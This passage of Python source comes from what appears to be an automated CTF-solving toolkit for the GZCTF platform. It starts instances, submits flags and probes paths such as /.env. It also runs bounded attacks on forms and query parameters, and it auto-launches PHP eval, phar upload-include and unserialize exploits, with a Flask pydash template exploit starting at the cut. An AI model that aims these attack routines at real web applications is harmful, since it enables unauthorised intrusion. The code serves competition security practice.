                        flag_candidates.extend(initial_flags)
                        initial_http["snippet"] = _sanitize_text(text, 800)
                        if not flag_candidates and _looks_php_eval_query_source(text):
                            params = _infer_php_eval_params(text) or ["code"]
                            auto_attack = json.loads(browser_attack_query_params(
                                base_url=instance_url,
                                params=params,
                                strategy="php_eval",
                                max_attempts=2,
                                timeout_ms=10000,
                            ))
                            auto_flags = auto_attack.get("flag_candidates", [])
                            initial_http["auto_attack"] = {
                                "tool": "browser_attack_query_params",
                                "strategy": "php_eval",
                                "params": params,
                                "status": auto_attack.get("status"),
                                "flag_candidates": auto_flags,
                                "attempts": auto_attack.get("attempts", [])[:3],
                            }
                            flag_candidates.extend(auto_flags)
                            initial_http["flag_candidates"] = list(dict.fromkeys([
                                *initial_http.get("flag_candidates", []),
                                *auto_flags,
                            ]))
            except Exception as exc:
                initial_http = {"url": instance_url, "status": "error", "error": str(exc)[:200]}

        instance_health = "not_started"
        next_actions: list[str] = []
        if instance_url:
            if tcp_probe.get("connected") is False:
                instance_health = "tcp_unreachable"
                next_actions.append(
                    "Do not hand off this target to a solver yet; the exposed TCP port is unreachable from here."
                )
                next_actions.append(
                    "Stop and restart the instance after cooldown, then verify tcp_probe.connected before exploit attempts."
                )
            elif tcp_probe.get("connected") is True:
                instance_health = "tcp_reachable"
            else:
                instance_health = "unknown"

        result = {
            "status": "instance_started" if instance_url else "challenge_selected",
            "instance_health": instance_health,
            "game": {
                "id": int(requested_game) if str(requested_game).isdigit() else requested_game,
                "title": selected_game.get("title", ""),
                "summary": selected_game.get("summary", ""),
            },
            "challenge": {
                "id": challenge_id,
                "title": challenge_detail.get("title") or selected_challenge.get("title", ""),
                "category": challenge_detail.get("category") or selected_challenge.get("category", category_name),
                "score": selected_challenge.get("score"),
                "solved": selected_challenge.get("solved"),
                "type": challenge_type,
                "content": _sanitize_text(challenge_detail.get("content", ""), 1200),
            },
            "title": challenge_detail.get("title") or selected_challenge.get("title", ""),
            "instance_entry": entry,
            "instance_url": instance_url,
            "attachment_url": context.get("url", ""),
            "start_response": start_response_data,
            "tcp_probe": tcp_probe,
            "initial_http": initial_http,
            "flag_candidates": list(dict.fromkeys(flag_candidates))[:10],
            "selection": selection,
            "candidate_count": len(candidates),
            "candidates": candidate_summary(candidates),
        }
        if next_actions:
            result["next_actions"] = next_actions
        return _sanitize_text(json.dumps(result, ensure_ascii=False, indent=2, default=str), 16000)
    except Exception as e:
        return f"GZCTF start web challenge error: {e}"


def browser_gzctf_submit_flag(
    game_id: str | int,
    challenge_title: str,
    flag: str,
    category: str = "",
    challenge_id: str | int = "",
    timeout_ms: int = 10000,
) -> str:
    """Submit a flag through the GZCTF UI and verify acceptance via game details."""
    session = get_session()
    try:
        session.ensure_browser()
        page = session.page
        platform_base = (_platform_config.get("base_url") or "").rstrip("/")
        if not platform_base:
            parsed = urlparse(page.url or "")
            if parsed.scheme and parsed.netloc:
                platform_base = f"{parsed.scheme}://{parsed.netloc}"
        if not platform_base:
            return json.dumps({"status": "error", "error": "missing platform base URL"}, ensure_ascii=False)

        gid = str(game_id or "").strip()
        if not gid:
            for source in (page.url or "", _platform_config.get("challenges_path", "")):
                match = re.search(r"/games/(\d+)", str(source))
                if match:
                    gid = match.group(1)
                    break
        if not gid:
            return json.dumps({"status": "error", "error": "missing game_id"}, ensure_ascii=False)

        request = page.context.request
        timeout = max(1000, min(int(timeout_ms or 10000), 30000))

        def api_get(path: str):
            return request.get(urljoin(platform_base + "/", path.lstrip("/")), timeout=timeout)

        def read_json(response: Any) -> dict[str, Any]:
            try:
                data = response.json()
            except Exception:
                text = response.text() if hasattr(response, "text") else ""
                return {"_error": "non_json_response", "_text": _sanitize_text(text, 1000)}
            return data if isinstance(data, dict) else {"data": data}

        def solved_ids(details: dict[str, Any]) -> set[str]:
            rank = details.get("rank", {}) if isinstance(details, dict) else {}
            solved = rank.get("solvedChallenges", []) if isinstance(rank, dict) else []
            ids: set[str] = set()
            if isinstance(solved, list):
                for item in solved:
                    if isinstance(item, dict) and item.get("id") is not None:
                        ids.add(str(item.get("id")))
                    elif item is not None:
                        ids.add(str(item))
            return ids

        def find_challenge(details: dict[str, Any]) -> dict[str, Any]:
            wanted_id = str(challenge_id or "").strip()
            wanted_title = (challenge_title or "").strip().lower()
            wanted_category = (category or "").strip().lower()
            challenges = details.get("challenges", {}) if isinstance(details, dict) else {}
            buckets: list[Any] = []
            if isinstance(challenges, dict):
                if wanted_category:
                    for key, value in challenges.items():
                        if str(key).lower() == wanted_category:
                            buckets.append(value)
                buckets.extend(value for value in challenges.values())
            elif isinstance(challenges, list):
                buckets.append(challenges)
            candidates: list[dict[str, Any]] = []
            for bucket in buckets:
                if isinstance(bucket, list):
                    candidates.extend(item for item in bucket if isinstance(item, dict))
            if wanted_id:
                for item in candidates:
                    if str(item.get("id", "")) == wanted_id:
                        return item
            if wanted_title:
                for item in candidates:
                    title = str(item.get("title", "")).strip().lower()
                    if title == wanted_title:
                        return item
                for item in candidates:
                    title = str(item.get("title", "")).strip().lower()
                    if wanted_title in title:
                        return item
            return {}

        details_before_response = api_get(f"/api/game/{gid}/details")
        details_before = read_json(details_before_response)
        selected = find_challenge(details_before)
        selected_id = str(selected.get("id") or challenge_id or "").strip()
        selected_title = str(selected.get("title") or challenge_title or "").strip()
        selected_score = selected.get("score")
        selected_solved = selected.get("solved")
        if not selected_title:
            return json.dumps({"status": "error", "error": "missing challenge_title"}, ensure_ascii=False)
        selected_content = str(selected.get("content") or "")
        if selected_id and not selected_content:
            try:
                detail_response = api_get(f"/api/game/{gid}/challenges/{selected_id}")
                if int(getattr(detail_response, "status", 0) or 0) == 200:
                    detail_data = read_json(detail_response)
                    selected_content = str(detail_data.get("content") or "")
            except Exception:
                selected_content = ""
        original_flag = flag.strip()
        submitted_flag = original_flag
        transformed_from_flag = ""
        if "md5" in selected_content.lower():
            match = re.fullmatch(r"cube\{(.+)\}", original_flag, re.IGNORECASE | re.DOTALL)
            if match:
                import hashlib

                submitted_flag = f"cube{{{hashlib.md5(match.group(1).encode()).hexdigest()}}}"
                if submitted_flag != original_flag:
                    transformed_from_flag = original_flag

        challenges_path = _platform_config.get("challenges_path") or f"/games/{gid}/challenges"
        if f"/games/{gid}/" not in str(challenges_path):
            challenges_path = f"/games/{gid}/challenges"
        page.goto(urljoin(platform_base + "/", str(challenges_path).lstrip("/")), wait_until="networkidle", timeout=30000)
        time.sleep(0.5)

        click_result = page.evaluate(r"""(args) => {
            const title = (args.title || '').trim().toLowerCase();
            const id = String(args.id || '');
            const score = args.score == null ? '' : String(args.score);
            const solved = args.solved == null ? '' : String(args.solved);
            const category = (args.category || '').trim().toLowerCase();
            const norm = s => (s || '').trim().replace(/\s+/g, ' ');
            const nodes = Array.from(document.querySelectorAll(
                'a[href], button, [role=button], .card, [class*=card], [class*=Card], [class*=challenge], [class*=Challenge], [class*=mantine-Card], [class*=mantine-Paper]'
            ));
            let target = null;
            if (id) {
                target = nodes.find(el => String(el.href || el.getAttribute('href') || '').includes(id));
            }
            const textOf = el => norm(el.innerText || el.textContent || el.getAttribute('aria-label'));
            const candidates = title ? nodes
                .map(el => ({el, text: textOf(el), lower: textOf(el).toLowerCase()}))
                .filter(item => item.lower.includes(title)) : [];
            if (!target && title && score && solved) {
                target = (candidates.find(item =>
                    item.lower.includes(score.toLowerCase()) &&
                    item.lower.includes(solved.toLowerCase())
                ) || {}).el || null;
            }
            if (!target && title && score) {
                target = (candidates.find(item => item.lower.includes(score.toLowerCase())) || {}).el || null;
            }
            if (!target && title && category) {
                target = (candidates.find(item => item.lower.includes(category)) || {}).el || null;
            }
            if (!target && title) {
                target = candidates.find(item => item.lower === title)?.el || null;
            }
            if (!target && title) {
                target = candidates[0]?.el || null;
            }
            if (!target) return {clicked: false, reason: 'not_found'};
            target.scrollIntoView({block: 'center', inline: 'center'});
            target.click();
            return {clicked: true, text: textOf(target), score, solved, category};
        }""", {
            "title": selected_title,
            "id": selected_id,
            "score": selected_score,
            "solved": selected_solved,
            "category": selected.get("category") or category,
        })
        time.sleep(0.5)

        fill_error = ""
        submit_error = ""
        try:
            inputs = page.locator('input[placeholder*="flag" i], textarea[placeholder*="flag" i], input, textarea')
            target_input = getattr(inputs, "last", inputs)
            if callable(target_input):
                target_input = target_input()
            target_input.fill(submitted_flag, timeout=timeout)
        except Exception as exc:
            fill_error = str(exc)[:300]

        try:
            buttons = page.locator('button[type=submit], button:has-text("提交"), button:has-text("Submit"), button:has-text("flag")')
            target_button = getattr(buttons, "last", buttons)
            if callable(target_button):
                target_button = target_button()
            target_button.click(timeout=timeout)
        except Exception as exc:
            submit_error = str(exc)[:300]

        time.sleep(1.0)
        body_text = ""
        try:
            body_text = _sanitize_text(page.inner_text("body"), 2000)
        except Exception:
            body_text = ""

        details_after_response = api_get(f"/api/game/{gid}/details")
        details_after = read_json(details_after_response)
        solved_after = solved_ids(details_after)
        accepted_by_details = bool(selected_id and selected_id in solved_after)
        lowered_body = body_text.lower()
        accepted_by_body = any(token in lowered_body for token in ("flag 正确", "flag correct", "accepted", "correct", "姝ｇ‘"))
        rejected_by_body = any(token in lowered_body for token in ("flag 错误", "wrong", "incorrect", "rejected", "错误", "閿欒"))
        status = "accepted" if accepted_by_details or accepted_by_body else ("rejected" if rejected_by_body else "ambiguous")

        result = {
            "status": status,
            "game_id": gid,
            "challenge": {
                "id": selected_id,
                "title": selected_title,
                "category": selected.get("category") or category,
            },
            "submitted_flag": submitted_flag,
            "submission_attempts": [original_flag, submitted_flag] if transformed_from_flag else [submitted_flag],
            "click_result": click_result,
            "fill_error": fill_error,
            "submit_error": submit_error,
            "accepted_by_details": accepted_by_details,
            "accepted_by_body": accepted_by_body,
            "solved_ids_after": sorted(solved_after),
            "body_preview": body_text,
        }
        if transformed_from_flag:
            result["transformed_from_flag"] = transformed_from_flag
            result["transform"] = "md5_inner_cube_flag"
        return _sanitize_text(json.dumps(result, ensure_ascii=False, indent=2, default=str), 12000)
    except Exception as e:
        return f"GZCTF submit flag error: {e}"


def browser_gzctf_stop_challenge(
    game_id: str | int,
    challenge_title: str = "",
    category: str = "",
    challenge_id: str | int = "",
    timeout_ms: int = 10000,
) -> str:
    """Stop a GZCTF dynamic/static container for a challenge via the official API."""
    session = get_session()
    try:
        session.ensure_browser()
        page = session.page
        platform_base = (_platform_config.get("base_url") or "").rstrip("/")
        if not platform_base:
            parsed = urlparse(page.url or "")
            if parsed.scheme and parsed.netloc:
                platform_base = f"{parsed.scheme}://{parsed.netloc}"
        gid = str(game_id or "").strip()
        if not gid:
            match = re.search(r"/games/(\d+)", str(page.url or ""))
            if match:
                gid = match.group(1)
        if not platform_base or not gid:
            return json.dumps({"status": "error", "error": "missing platform base URL or game_id"}, ensure_ascii=False)

        request = page.context.request
        timeout = max(1000, min(int(timeout_ms or 10000), 30000))

        def api_get(path: str):
            return request.get(urljoin(platform_base + "/", path.lstrip("/")), timeout=timeout)

        def read_json(response: Any) -> dict[str, Any]:
            try:
                data = response.json()
            except Exception:
                return {}
            return data if isinstance(data, dict) else {}

        cid = str(challenge_id or "").strip()
        selected: dict[str, Any] = {}
        if not cid:
            details = read_json(api_get(f"/api/game/{gid}/details"))
            wanted_title = (challenge_title or "").strip().lower()
            wanted_category = (category or "").strip().lower()
            buckets = details.get("challenges", {}) if isinstance(details, dict) else {}
            candidates: list[dict[str, Any]] = []
            if isinstance(buckets, dict):
                for key, value in buckets.items():
                    if wanted_category and str(key).lower() != wanted_category:
                        continue
                    if isinstance(value, list):
                        candidates.extend(item for item in value if isinstance(item, dict))
                if not candidates:
                    for value in buckets.values():
                        if isinstance(value, list):
                            candidates.extend(item for item in value if isinstance(item, dict))
            for item in candidates:
                title = str(item.get("title", "")).strip().lower()
                if wanted_title and (title == wanted_title or wanted_title in title):
                    selected = item
                    cid = str(item.get("id") or "")
                    break
        if not cid:
            return json.dumps({"status": "error", "error": "missing challenge_id"}, ensure_ascii=False)

        url = urljoin(platform_base + "/", f"/api/game/{gid}/container/{cid}".lstrip("/"))
        response = request.delete(url, timeout=timeout)
        status = int(getattr(response, "status", 0) or 0)
        body = ""
        try:
            body = response.text()
        except Exception:
            body = ""
        result = {
            "status": "stopped" if 200 <= status < 300 else "error",
            "game_id": gid,
            "challenge": {
                "id": cid,
                "title": selected.get("title") or challenge_title,
                "category": selected.get("category") or category,
            },
            "http_status": status,
            "body_preview": _sanitize_text(body, 800),
        }
        return _sanitize_text(json.dumps(result, ensure_ascii=False, indent=2, default=str), 4000)
    except Exception as e:
        return f"GZCTF stop challenge error: {e}"


def browser_probe_paths(base_url: str = "", paths: list[str] | str | None = None, timeout_ms: int = 5000) -> str:
    """Probe HTTP paths using the active browser context and cookies."""
    session = get_session()
    default_paths = [
        "/api",
        "/api/v1",
        "/openapi.json",
        "/swagger.json",
        "/api-docs",
        "/graphql",
        "/robots.txt",
        "/admin",
        "/debug",
        "/.env",
    ]
    try:
        session.ensure_browser()
        page = session.page
        target_base = _prefer_last_instance_url(base_url or page.url or "")
        if not target_base:
            return json.dumps({"status": "error", "error": "missing base_url"}, ensure_ascii=False)

        if isinstance(paths, str):
            raw_paths = [part.strip() for part in re.split(r"[\n,]+", paths) if part.strip()]
        else:
            raw_paths = [str(part).strip() for part in (paths or default_paths) if str(part).strip()]
        raw_paths = raw_paths[:20]
        timeout = max(1000, min(int(timeout_ms or 5000), 10000))

        probes: list[dict[str, Any]] = []
        flag_candidates: list[str] = []
        auto_attack_done = False
        for raw_path in raw_paths:
            url = raw_path if raw_path.startswith(("http://", "https://")) else urljoin(target_base.rstrip("/") + "/", raw_path.lstrip("/"))
            entry: dict[str, Any] = {"path": raw_path, "url": url}
            stop_after_entry = False
            try:
                response = page.context.request.get(url, timeout=timeout)
                content_type = response.headers.get("content-type", "")
                entry.update({
                    "status": response.status,
                    "content_type": content_type,
                    "server": response.headers.get("server", ""),
                    "x_powered_by": response.headers.get("x-powered-by", ""),
                })
                if _looks_textual(content_type):
                    try:
                        text = response.text()
                        entry["flag_candidates"] = _extract_flag_candidates(text)
                        flag_candidates.extend(entry["flag_candidates"])
                        entry["snippet"] = _sanitize_text(text, 800)
                        if not flag_candidates and not auto_attack_done and _looks_php_eval_query_source(text):
                            params = _infer_php_eval_params(text) or ["code"]
                            try:
                                auto_attack = json.loads(browser_attack_query_params(
                                    base_url=url,
                                    params=params,
                                    strategy="php_eval",
                                    max_attempts=2,
                                    timeout_ms=timeout,
                                ))
                                auto_attack_done = True
                                auto_flags = auto_attack.get("flag_candidates", [])
                                entry["auto_attack"] = {
                                    "tool": "browser_attack_query_params",
                                    "strategy": "php_eval",
                                    "params": params,
                                    "status": auto_attack.get("status"),
                                    "flag_candidates": auto_flags,
                                    "attempts": auto_attack.get("attempts", [])[:3],
                                }
                                entry["flag_candidates"] = list(dict.fromkeys([
                                    *entry.get("flag_candidates", []),
                                    *auto_flags,
                                ]))
                                flag_candidates.extend(auto_flags)
                            except Exception as exc:
                                auto_attack_done = True
                                entry["auto_attack"] = {
                                    "tool": "browser_attack_query_params",
                                    "status": "error",
                                    "error": str(exc)[:200],
                                }
                        stop_after_entry = bool(flag_candidates)
                    except Exception as exc:
                        entry["snippet_error"] = str(exc)[:120]
            except Exception as exc:
                entry.update({"status": "error", "error": str(exc)[:300]})
            probes.append(entry)
            if stop_after_entry:
                break

        interesting = [
            probe for probe in probes
            if probe.get("status") not in (404, "error", None)
            or any(marker in str(probe.get("snippet", "")).lower() for marker in ("swagger", "openapi", "graphql", "traceback", "exception"))
        ]
        return _sanitize_text(json.dumps({
            "status": "probe_complete",
            "base_url": target_base,
            "probes": probes,
            "interesting": interesting[:10],
            "flag_candidates": list(dict.fromkeys(flag_candidates))[:10],
        }, ensure_ascii=False, indent=2), 16000)
    except Exception as e:
        return f"Browser probe paths error: {e}"


def browser_request(
    url: str = "",
    method: str = "GET",
    headers: dict[str, str] | str | None = None,
    data: str | dict[str, Any] = "",
    json_body: str | dict[str, Any] | None = None,
    timeout_ms: int = 8000,
) -> str:
    """Make an HTTP request from the active browser context, preserving cookies."""
    session = get_session()
    try:
        session.ensure_browser()
        page = session.page
        target = (url or page.url or "").strip()
        if not target:
            return json.dumps({"status": "error", "error": "missing url"}, ensure_ascii=False)
        if not target.startswith(("http://", "https://")):
            target = urljoin(page.url.rstrip("/") + "/", target.lstrip("/"))

        request_headers = _parse_headers(headers)
        body = data
        if json_body not in (None, ""):
            parsed_json = json_body
            if isinstance(json_body, str):
                parsed_json = json.loads(json_body)
            body = json.dumps(parsed_json, ensure_ascii=False)
            request_headers.setdefault("content-type", "application/json")
        elif isinstance(data, dict):
            body = urlencode({str(key): str(value) for key, value in data.items()})
            request_headers.setdefault("content-type", "application/x-www-form-urlencoded")

        timeout = max(1000, min(int(timeout_ms or 8000), 20000))
        response = page.context.request.fetch(
            target,
            method=(method or "GET").upper(),
            headers=request_headers or None,
            data=body if body not in (None, "") else None,
            timeout=timeout,
        )
        content_type = response.headers.get("content-type", "")
        text = ""
        if _looks_textual(content_type):
            try:
                text = _sanitize_text(response.text(), 4000)
            except Exception as exc:
                text = f"[response text error] {str(exc)[:160]}"

        result = {
            "status": "request_complete",
            "method": (method or "GET").upper(),
            "url": target,
            "http_status": response.status,
            "content_type": content_type,
            "headers": _interesting_headers(response.headers),
            "flag_candidates": _extract_flag_candidates(text),
            "text": text,
        }
        if not result["flag_candidates"] and _looks_php_eval_query_source(text):
            params = _infer_php_eval_params(text) or ["code"]
            try:
                auto_attack = json.loads(browser_attack_query_params(
                    base_url=target,
                    params=params,
                    strategy="php_eval",
                    max_attempts=2,
                    timeout_ms=timeout,
                ))
                result["auto_attack"] = {
                    "tool": "browser_attack_query_params",
                    "strategy": "php_eval",
                    "params": params,
                    "status": auto_attack.get("status"),
                    "flag_candidates": auto_attack.get("flag_candidates", []),
                    "attempts": auto_attack.get("attempts", [])[:3],
                }
                result["flag_candidates"] = list(dict.fromkeys([
                    *result["flag_candidates"],
                    *auto_attack.get("flag_candidates", []),
                ]))
            except Exception as exc:
                result["auto_attack"] = {
                    "tool": "browser_attack_query_params",
                    "status": "error",
                    "error": str(exc)[:200],
                }
        if not result["flag_candidates"] and _looks_php_upload_include_source(text):
            try:
                auto_attack = json.loads(browser_attack_upload_include(
                    base_url=target,
                    timeout_ms=timeout,
                ))
                result["auto_attack"] = {
                    "tool": "browser_attack_upload_include",
                    "strategy": "phar_gzip_png",
                    "status": auto_attack.get("status"),
                    "flag_candidates": auto_attack.get("flag_candidates", []),
                    "attempts": auto_attack.get("attempts", [])[:3],
                }
                result["flag_candidates"] = list(dict.fromkeys([
                    *result["flag_candidates"],
                    *auto_attack.get("flag_candidates", []),
                ]))
            except Exception as exc:
                result["auto_attack"] = {
                    "tool": "browser_attack_upload_include",
                    "status": "error",
                    "error": str(exc)[:200],
                }
        if not result["flag_candidates"] and _looks_php_unserialize_flag_source(text):
            try:
                auto_attack = json.loads(browser_attack_php_unserialize(
                    base_url=target,
                    timeout_ms=timeout,
                ))
                result["auto_attack"] = {
                    "tool": "browser_attack_php_unserialize",
                    "strategy": "flag_create_function",
                    "status": auto_attack.get("status"),
                    "flag_candidates": auto_attack.get("flag_candidates", []),
                    "attempts": auto_attack.get("attempts", [])[:3],
                }
                result["flag_candidates"] = list(dict.fromkeys([
                    *result["flag_candidates"],
                    *auto_attack.get("flag_candidates", []),
                ]))
            except Exception as exc:
                result["auto_attack"] = {
                    "tool": "browser_attack_php_unserialize",
                    "status": "error",
                    "error": str(exc)[:200],
                }
        return _sanitize_text(json.dumps(result, ensure_ascii=False, indent=2), 12000)
    except Exception as e:
        return f"Browser request error: {e}"


def browser_attack_forms(
    strategy: str = "auto",
    payloads: list[str] | str | None = None,
    max_attempts: int = 10,
    timeout_ms: int = 8000,
) -> str:
    """Submit current page forms with a bounded set of CTF payloads."""
    session = get_session()
    try:
        session.ensure_browser()
        page = session.page
        forms = page.evaluate(r"""() => {
            const formNodes = Array.from(document.querySelectorAll('form'));
            const standaloneInputs = Array.from(document.querySelectorAll('input, textarea, select'))
                .filter(el => !el.form);
            const describeInput = (el, index) => ({
                index,
                tag: el.tagName,
                type: (el.type || '').toLowerCase(),
                name: el.name || el.id || '',
                id: el.id || '',
                value: el.value || '',
                placeholder: el.placeholder || ''
            });
            const forms = formNodes.map((form, index) => ({
                index,
                action: form.action || location.href,
                method: (form.method || 'GET').toUpperCase(),
                inputs: Array.from(form.querySelectorAll('input, textarea, select')).map(describeInput)
            }));
            if (!forms.length && standaloneInputs.length) {
                forms.push({
                    index: 0,
                    action: location.href,
                    method: 'GET',
                    inputs: standaloneInputs.map(describeInput)
                });
            }
            return forms;
        }""")

        chosen_payloads = _attack_payloads(strategy, payloads)
        attempt_limit = max(1, min(int(max_attempts or 10), 25))
        timeout = max(1000, min(int(timeout_ms or 8000), 20000))
        attempts: list[dict[str, Any]] = []

        for form in forms[:5]:
            inputs = [item for item in form.get("inputs", []) if item.get("name")]
            attackable = [
                item for item in inputs
                if item.get("type") not in {"hidden", "submit", "button", "reset", "file", "checkbox", "radio"}
            ]
            if not attackable:
                continue
            for payload in chosen_payloads:
                if len(attempts) >= attempt_limit:
                    break
                fields: dict[str, str] = {}
                for item in inputs:
                    name = str(item.get("name") or "")
                    input_type = str(item.get("type") or "").lower()
                    if not name:
                        continue
                    if input_type == "hidden":
                        fields[name] = str(item.get("value") or "")
                    elif input_type in {"submit", "button", "reset", "file", "checkbox", "radio"}:
                        continue
                    elif input_type == "password":
                        fields[name] = payload if _looks_auth_payload(payload) else "x"
                    else:
                        fields[name] = payload

                action = str(form.get("action") or page.url)
                target = action if action.startswith(("http://", "https://")) else urljoin(page.url, action)
                method = str(form.get("method") or "GET").upper()
                result: dict[str, Any] = {
                    "form_index": form.get("index"),
                    "method": method,
                    "url": target,
                    "payload": payload,
                    "fields": list(fields.keys()),
                }
                try:
                    if method == "GET":
                        separator = "&" if "?" in target else "?"
                        request_url = target + separator + urlencode(fields)
                        response = page.context.request.get(request_url, timeout=timeout)
                    else:
                        response = page.context.request.fetch(
                            target,
                            method=method,
                            headers={"content-type": "application/x-www-form-urlencoded"},
                            data=urlencode(fields),
                            timeout=timeout,
                        )
                    content_type = response.headers.get("content-type", "")
                    snippet = ""
                    if _looks_textual(content_type):
                        snippet = _sanitize_text(response.text(), 1200)
                    result.update({
                        "http_status": response.status,
                        "content_type": content_type,
                        "flag_candidates": _extract_flag_candidates(snippet),
                        "success_indicators": _success_indicators(snippet),
                        "snippet": snippet,
                    })
                except Exception as exc:
                    result.update({"http_status": "error", "error": str(exc)[:300]})
                attempts.append(result)

        summary = {
            "status": "attack_complete",
            "strategy": strategy or "auto",
            "forms_seen": len(forms),
            "attempts": attempts,
            "flag_candidates": list(dict.fromkeys(candidate for item in attempts for candidate in item.get("flag_candidates", []))),
        }
        return _sanitize_text(json.dumps(summary, ensure_ascii=False, indent=2), 16000)
    except Exception as e:
        return f"Browser attack forms error: {e}"


def browser_attack_query_params(
    base_url: str = "",
    params: list[str] | str | dict[str, Any] | None = None,
    strategy: str = "auto",
    payloads: list[str] | str | None = None,
    max_attempts: int = 10,
    timeout_ms: int = 8000,
) -> str:
    """Attack query-parameter sinks with bounded CTF payloads."""
    session = get_session()
    try:
        session.ensure_browser()
        page = session.page
        target = (base_url or page.url or "").strip()
        if not target:
            return json.dumps({"status": "error", "error": "missing base_url"}, ensure_ascii=False)
        if not target.startswith(("http://", "https://")):
            target = urljoin(page.url.rstrip("/") + "/", target.lstrip("/"))

        chosen_params = _query_attack_params(params, target)
        chosen_payloads = _query_attack_payloads(strategy, payloads)
        attempt_limit = max(1, min(int(max_attempts or 10), 30))
        timeout = max(1000, min(int(timeout_ms or 8000), 20000))

        attempts: list[dict[str, Any]] = []
        found_flag = False
        for param in chosen_params:
            for payload_spec in chosen_payloads:
                if len(attempts) >= attempt_limit or found_flag:
                    break
                payload = payload_spec["payload"]
                headers = dict(payload_spec.get("headers", {}))
                url = _url_with_query_param(target, param, payload)
                attempt: dict[str, Any] = {
                    "transport": "browser",
                    "param": param,
                    "payload": payload,
                    "url": url,
                    "headers": headers,
                }
                try:
                    response = page.context.request.get(url, headers=headers or None, timeout=timeout)
                    content_type = response.headers.get("content-type", "")
                    snippet = ""
                    flag_candidates: list[str] = []
                    if _looks_textual(content_type):
                        full_text = response.text()
                        flag_candidates = _extract_flag_candidates(full_text)
                        snippet = _sanitize_text(full_text, 1400)
                    attempt.update({
                        "http_status": response.status,
                        "content_type": content_type,
                        "flag_candidates": flag_candidates,
                        "success_indicators": _success_indicators(snippet),
                        "snippet": snippet,
                    })
                except Exception as exc:
                    attempt.update({"http_status": "error", "error": str(exc)[:300]})
                attempts.append(attempt)
                found_flag = bool(attempt.get("flag_candidates"))

                raw_headers = payload_spec.get("raw_ordered_headers", [])
                if (
                    not found_flag
                    and raw_headers
                    and len(attempts) < attempt_limit
                    and urlparse(url).scheme == "http"
                ):
                    raw_payload = str(payload_spec.get("raw_payload") or payload)
                    raw_url = _url_with_query_param(target, param, raw_payload)
                    raw_attempt: dict[str, Any] = {
                        "transport": "raw_http",
                        "param": param,
                        "payload": raw_payload,
                        "url": raw_url,
                        "headers": dict(raw_headers),
                    }
                    try:
                        status, response_headers, text = _raw_http_get(raw_url, raw_headers, timeout)
                        snippet = _sanitize_text(text, 1400)
                        raw_attempt.update({
                            "http_status": status,
                            "content_type": response_headers.get("content-type", ""),
                            "flag_candidates": _extract_flag_candidates(text),
                            "success_indicators": _success_indicators(snippet),
                            "snippet": snippet,
                        })
                    except Exception as exc:
                        raw_attempt.update({"http_status": "error", "error": str(exc)[:300]})
                    attempts.append(raw_attempt)
                    found_flag = bool(raw_attempt.get("flag_candidates"))
            if len(attempts) >= attempt_limit:
                break
            if found_flag:
                break

        summary = {
            "status": "attack_complete",
            "strategy": strategy or "auto",
            "base_url": target,
            "params": chosen_params,
            "attempts": attempts,
            "flag_candidates": list(dict.fromkeys(candidate for item in attempts for candidate in item.get("flag_candidates", []))),
        }
        return _sanitize_text(json.dumps(summary, ensure_ascii=False, indent=2), 18000)
    except Exception as e:
        return f"Browser attack query params error: {e}"


def browser_attack_listing_query(
    base_url: str = "",
    params: list[str] | str | dict[str, Any] | None = None,
    payloads: list[str] | str | None = None,
    max_attempts: int = 24,
    timeout_ms: int = 8000,
) -> str:
    """Map GET-listing/filter pages and return structured query differentials."""
    session = get_session()
    try:
        session.ensure_browser()
        page = session.page
        target = _prefer_last_instance_url(base_url or page.url or "")
        if not target:
            return json.dumps({"status": "error", "error": "missing base_url"}, ensure_ascii=False)
        if not target.startswith(("http://", "https://")):
            target = urljoin(page.url.rstrip("/") + "/", target.lstrip("/"))

        timeout = max(1000, min(int(timeout_ms or 8000), 20000))
        request_context = getattr(getattr(page, "context", None), "request", None)
        if not callable(getattr(request_context, "get", None)):
            return json.dumps({"status": "error", "error": "browser request context unavailable"}, ensure_ascii=False)

        def read(url: str) -> tuple[str, dict[str, Any]]:
            response = request_context.get(url, timeout=timeout)
            headers = getattr(response, "headers", {}) or {}
            content_type = headers.get("content-type", "")
            text = ""
            if _looks_textual(content_type):
                response_text = getattr(response, "text", "")
                text = response_text() if callable(response_text) else str(response_text or "")
            record = {
                "url": getattr(response, "url", url),
                "http_status": getattr(response, "status", None) or getattr(response, "status_code", None),
                "content_type": content_type,
                "headers": _interesting_headers(headers),
                "flag_candidates": _extract_flag_candidates(text),
                "success_indicators": _success_indicators(text),
                "snippet": _sanitize_text(text, 1200),
            }
            return text, record

        baseline_text, baseline_record = read(target)
        chosen_params = _listing_query_params(params, target, baseline_text)
        payload_plan = _listing_query_payloads(payloads)
        attempt_limit = max(1, min(int(max_attempts or 24), 60))

        baseline_fingerprint = _listing_response_fingerprint(baseline_text, baseline_record.get("http_status"))
        attempts: list[dict[str, Any]] = []
        flag_candidates: list[str] = list(baseline_record.get("flag_candidates", []))

        for param in chosen_params:
            for payload in payload_plan:
                if len(attempts) >= attempt_limit or flag_candidates:
                    break
                url = _url_with_query_param(target, param, payload)
                attempt: dict[str, Any] = {
                    "param": param,
                    "payload": payload,
                    "url": url,
                }
                try:
                    text, record = read(url)
                    fingerprint = _listing_response_fingerprint(text, record.get("http_status"))
                    attempt.update(record)
                    attempt["signals"] = _listing_query_signals(text, record.get("http_status"), baseline_fingerprint, fingerprint)
                    attempt["items"] = _extract_listing_items(text)
                    flag_candidates.extend(record.get("flag_candidates", []))
                except Exception as exc:
                    attempt.update({
                        "http_status": "error",
                        "error": str(exc)[:300],
                        "signals": ["request_error"],
                    })
                attempts.append(attempt)
            if len(attempts) >= attempt_limit or flag_candidates:
                break

        unique_flags = list(dict.fromkeys(flag_candidates))[:10]
        summary = {
            "status": "flag_found" if unique_flags else "attack_complete",
            "strategy": "listing_query_differential",
            "base_url": target,
            "params": chosen_params,
            "payloads": payload_plan[:12],
            "baseline": {
                **baseline_record,
                "fingerprint": baseline_fingerprint,
                "params_from_page": _listing_query_params([], target, baseline_text),
                "items": _extract_listing_items(baseline_text),
            },
            "attempts": attempts,
            "flag_candidates": unique_flags,
            "next_actions": _listing_query_next_actions(attempts, unique_flags),
        }
        return _sanitize_text(json.dumps(summary, ensure_ascii=False, indent=2), 24000)
    except Exception as e:
        return f"Browser attack listing query error: {e}"


def browser_attack_flask_pydash_template(
    base_url: str = "",
    username: str = "",
    password: str = "",
    timeout_ms: int = 8000,
) -> str:
    """Exploit Flask pydash path pollution into Jinja template file reads."""
    import random
    import requests
    import string

    session = get_session()
    try:
        target = _prefer_last_instance_url(base_url or (session.page.url if session.page else ""))
    except Exception:
        target = base_url
    target = (target or "").strip().rstrip("/")
    if not target:
        return json.dumps({"status": "error", "error": "missing base_url"}, ensure_ascii=False)

